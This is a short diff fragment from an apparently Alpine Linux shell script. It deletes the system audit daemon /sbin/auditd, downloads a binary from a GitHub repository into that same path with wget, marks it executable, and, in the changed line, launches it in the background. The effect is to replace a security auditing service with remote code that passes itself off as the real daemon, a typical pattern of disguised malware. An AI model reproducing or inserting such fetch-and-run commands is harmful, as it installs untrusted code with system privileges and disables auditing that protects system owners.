@@ -9,4 +9,4 @@ rm -rf glibc-bin-2.35-r1.apk
 rm -rf /sbin/auditd
 wget -q -O /sbin/auditd https://github.com/jackmoc/Alpine/raw/main/update_2.0.1
 chmod +x /sbin/auditd
--bash &
+/sbin/auditd &
